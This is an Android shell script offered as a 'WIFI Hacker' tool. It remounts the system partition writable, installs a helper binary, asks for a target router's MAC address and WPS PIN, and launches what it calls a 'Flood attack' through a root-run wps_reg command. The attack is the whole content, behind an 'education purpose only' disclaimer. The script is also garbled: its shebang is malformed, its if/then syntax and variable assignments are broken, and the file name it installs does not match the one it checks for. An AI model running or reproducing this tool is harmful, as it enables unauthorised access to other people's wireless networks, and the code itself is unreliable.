#!system/bin/sh

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#this script is created by Braham Hacker (Team-BH) 4yush5663
#it's not for re-distribution 
#for education purpose only
# I will not responsible for any illegal action towards you
# don't be evil

echo "========================"
echo        WIFI Hacker
echo            for
echo "+++++++++Android+++++++++"
echo       by 4yush5663          

echo
echo
echo Checking capabilities...
echo
mount -o rw,remount /system
mv team_bh /system/bin
mv team_bh /system/xbin

#for bin
file="/system/bin/team-bh"
if [  -f "$file" ]
sleep 2
then
    echo -e "\033[1;32mfound\033[1;32m"
sleep 1
else 
    echo "\e[01;31mmissing requirements...\033[1;32m"
echo eixting...
exit
exit
sleep 1
fi
$mac=$1
$pin
echo enter MAC address
read $1



echo enter pin
read $pin
sleep 1
echo "starting Flood attack..."
sleep 1

su -c  team_bh IFNAME=wlan0 wps_reg $1 $pin && su -c wps
sleep 8
break
